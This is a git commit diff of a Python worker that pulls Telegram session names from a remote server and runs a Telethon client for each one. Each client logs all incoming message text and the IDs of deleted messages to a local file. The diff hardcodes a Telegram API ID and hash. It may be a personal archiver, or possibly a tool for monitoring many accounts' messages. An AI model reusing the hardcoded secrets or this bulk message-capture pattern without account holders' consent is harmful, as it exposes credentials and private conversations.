7950c3a57182ab58f5d2d9896510ada9bb5db220
NekoNiss <103840040+NekoNiss@users.noreply.github.com>
2026-03-29 18:46:55 +0500

    Update worker.py

--- worker.py
+++ worker.py
@@ -1,27 +1,47 @@
-import aiohttp
 import asyncio
+import requests
+import os
+from telethon import TelegramClient, events
 
-SERVER = "https://gleaming-truth-production-ed48.up.railway.app"
+API_ID = 30074866
+API_HASH = "eea91e3c3b0381b36d455383fe5b9989"
+SERVER_URL = "https://gleaming-truth-production-ed48.up.railway.app/"
 
-async def get_sessions():
-    async with aiohttp.ClientSession() as session:
-        async with session.get(f"{SERVER}/sessions") as resp:
-            data = await resp.json()
-            return data.get("sessions", [])  # FIX
+async def run_client(session_name):
+    try:
+        client = TelegramClient(f"sessions/{session_name}", API_ID, API_HASH)
+        await client.start()
 
+        @client.on(events.NewMessage)
+        async def handler(event):
+            with open("logs.txt", "a", encoding="utf-8") as f:
+                f.write(f"NEW: {event.text}\n")
+
+        @client.on(events.MessageDeleted)
+        async def deleted_handler(event):
+            with open("logs.txt", "a", encoding="utf-8") as f:
+                f.write(f"DELETED MESSAGE ID: {event.deleted_ids}\n")
+
+        await client.run_until_disconnected()
+    except Exception as e:
+        print(f"Error {session_name}: {e}")
+        await asyncio.sleep(5)
+        await run_client(session_name)
 
 async def main():
-    print("🚀 WORKER START")
-
     while True:
-        sessions = await get_sessions()
-        print("sessions:", sessions)
+        try:
+            res = requests.get(f"{SERVER_URL}/sessions").json()
+            sessions = res.get("sessions", [])
 
-        if not sessions:
-            print("❌ No sessions found")
+            tasks = []
+            for s in sessions:
+                tasks.append(run_client(s))
 
-        await asyncio.sleep(10)
-
+            await asyncio.gather(*tasks)
+        except Exception as e:
+            print("Worker error:", e)
+            await asyncio.sleep(10)
 
 if __name__ == "__main__":
     asyncio.run(main())
